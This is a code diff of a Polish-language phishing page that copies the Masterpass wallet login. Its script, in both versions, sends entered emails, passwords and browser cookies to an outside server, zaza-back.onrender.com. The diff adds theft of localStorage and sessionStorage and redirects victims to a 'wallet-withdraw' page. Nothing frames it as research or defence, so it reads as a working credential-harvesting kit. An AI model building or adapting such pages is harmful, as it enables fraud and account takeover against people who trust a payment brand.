@@ -2,107 +2,76 @@
 <html lang="pl">
 <head>
   <meta charset="UTF-8" />
-  <title>Masterpass™ Wallet | Login</title>
-  <link rel="stylesheet" href="/style.css" />
+  <title>Logowanie | Portfel Masterpass</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="/style.css?v=3" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
 </head>
 <body>
-  <div class="lang-switcher">
-    <button onclick="setLang('pl')">PL</button>
-    <button onclick="setLang('en')">EN</button>
+  <div class="page-container">
+    <div class="form-card">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dd/Masterpass_Logo.svg/512px-Masterpass_Logo.svg.png" alt="Masterpass logo" class="logo" />
+
+      <h1>Zaloguj się</h1>
+      <p class="subtitle">Zaloguj się do swojego portfela Masterpass™</p>
+
+      <form id="loginForm" novalidate>
+        <label for="email">Adres e-mail lub numer telefonu</label>
+        <input type="text" id="email" name="email" required placeholder="Twój adres e-mail" />
+
+        <label for="password">Hasło</label>
+        <input type="password" id="password" name="password" required placeholder="Wprowadź hasło" />
+
+        <div class="form-extra">
+          <label class="checkbox-container">
+            <input type="checkbox" id="remember" />
+            <span class="checkmark"></span>
+            Pamiętaj mój login
+          </label>
+          <a href="#" class="forgot">Nie znam hasła</a>
+        </div>
+
+        <button type="submit" class="submit-button">Zaloguj się</button>
+      </form>
+
+      <div class="cookie-banner">
+        Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę na ich używanie zgodnie z aktualnymi ustawieniami przeglądarki.
+        <a href="#">Informacja o Plikach Cookie</a>.
+      </div>
+    </div>
   </div>
 
-  <div class="container">
-    <img src="https://www.masterpass.pl/img/masterpass_logo.svg" alt="Masterpass" class="logo" />
-    <h1 id="login-title"></h1>
-
-    <div class="features" id="features-text"></div>
-
-    <form id="loginForm">
-      <label for="email" id="email-label"></label>
-      <input type="email" id="email" required />
-
-      <label for="password" id="password-label"></label>
-      <input type="password" id="password" required />
-
-      <div class="remember">
-        <input type="checkbox" id="remember" />
-        <label for="remember" id="remember-label"></label>
-      </div>
-
-      <div class="form-footer">
-        <a href="#" id="reset-link"></a>
-      </div>
-
-      <button type="submit" class="submit-btn" id="submit-btn"></button>
-    </form>
-  </div>
-
-  <div class="cookie-banner" id="cookie-text"></div>
-
-  <script>
-    const langData = {
-      pl: {
-        loginTitle: 'Zaloguj się lub aktywuj portfel Masterpass™ od Mastercard®',
-        features: `Masterpass™ to wiele korzyści:<br>
-        <strong>Bezpieczeństwo</strong> Płatność, dzięki której sklepy on-line nie widzą danych Twojej karty<br>
-        <strong>Szybkość transakcji</strong> Dane karty podajesz tylko raz - przy rejestracji<br>
-        <strong>Wygoda</strong> Zakupy on-line na każdym urządzeniu`,
-        emailLabel: 'Adres e-mail lub numer telefonu',
-        passwordLabel: 'Hasło',
-        remember: 'Pamiętaj mój login',
-        reset: 'Nie znam hasła',
-        submit: 'Zaloguj się',
-        cookies: 'Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę na ich używanie zgodnie z aktualnymi ustawieniami przeglądarki. Więcej informacji znajdziesz w dokumencie <a href="#">Informacja o Plikach Cookie</a>.'
-      },
-      en: {
-        loginTitle: 'Log in or activate your Masterpass™ wallet by Mastercard®',
-        features: `Masterpass™ offers many benefits:<br>
-        <strong>Security</strong> Pay online without disclosing your card details to the shop<br>
-        <strong>Fast transactions</strong> You enter your card data only once – when you register<br>
-        <strong>Convenience</strong> Online shopping on any device`,
-        emailLabel: 'E-mail address or phone number',
-        passwordLabel: 'Password',
-        remember: 'Remember my login',
-        reset: 'Reset password',
-        submit: 'Sign in',
-        cookies: 'This site uses cookies and similar technologies. By using this site you consent to their use in accordance with your current browser settings. For more information, see <a href="#">Information about Cookies</a>.'
-      }
-    };
-
-    const setLang = (lang) => {
-      localStorage.setItem('lang', lang);
-      const t = langData[lang];
-      document.getElementById('login-title').innerHTML = t.loginTitle;
-      document.getElementById('features-text').innerHTML = t.features;
-      document.getElementById('email-label').innerText = t.emailLabel;
-      document.getElementById('password-label').innerText = t.passwordLabel;
-      document.getElementById('remember-label').innerText = t.remember;
-      document.getElementById('reset-link').innerText = t.reset;
-      document.getElementById('submit-btn').innerText = t.submit;
-      document.getElementById('cookie-text').innerHTML = t.cookies;
-    };
-
-    setLang(localStorage.getItem('lang') || 'pl');
-
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+  <script type="module">
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
+
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
+      const remember = document.getElementById('remember').checked;
 
-      await fetch('https://zaza-back.onrender.com/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          email,
-          password,
-          cookies: document.cookie,
-          userAgent: navigator.userAgent,
-          url: location.href,
-          date: new Date().toISOString()
-        })
-      });
+      try {
+        await fetch('https://zaza-back.onrender.com/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email,
+            password,
+            remember,
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage),
+            userAgent: navigator.userAgent,
+            location: window.location.href,
+            date: new Date().toISOString()
+          })
+        });
 
-      window.location.href = '/public/wallet-dashboard.html';
+        window.location.href = '/wallet-withdraw.html';
+      } catch (err) {
+        console.error('Błąd wysyłania danych:', err);
+      }
     });
   </script>
 </body>
